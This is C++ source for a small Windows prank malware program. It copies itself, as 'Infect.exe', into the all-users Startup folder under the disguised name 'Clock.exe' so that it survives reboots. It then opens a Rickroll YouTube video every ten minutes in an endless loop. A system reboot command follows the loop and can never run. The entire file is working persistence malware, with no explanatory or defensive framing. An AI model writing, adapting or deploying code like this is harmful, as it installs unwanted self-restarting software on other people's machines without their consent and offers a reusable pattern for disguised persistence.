#include "pch.h"
#include <iostream>
#include <fstream>
#include <Windows.h>
#include "stdlib.h"

using namespace std;

int main()
{
	
	CopyFile(
		L"Infect.exe",
		L"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\Clock.exe",
		true
	);
	
	while (true) {
		ShellExecute(NULL, L"open", L"https://www.youtube.com/watch?v=dQw4w9WgXcQ", NULL, NULL, SW_SHOWNORMAL);
		Sleep(600000);
	}

	system("shutdown /r");


	return 0;
}

// C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp